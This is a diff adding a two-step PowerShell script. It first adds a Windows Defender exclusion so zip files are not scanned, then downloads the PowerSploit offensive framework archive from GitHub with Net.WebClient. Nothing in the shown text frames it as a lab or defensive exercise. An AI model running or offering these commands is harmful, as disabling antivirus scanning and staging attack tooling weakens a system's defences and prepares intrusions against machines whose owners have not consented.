@@ -1,0 +1,7 @@
+#Add exclusion for scanning zips to Windows Defender
+Add-MpPreference -ExclusionExtension zip
+
+#Download Powersploit file using powershell
+(New-Object Net.WebClient).DownloadFile('https://github.com/PowerShellMafia/PowerSploit/archive/master.zip','.\Powersploit.zip')
+
+
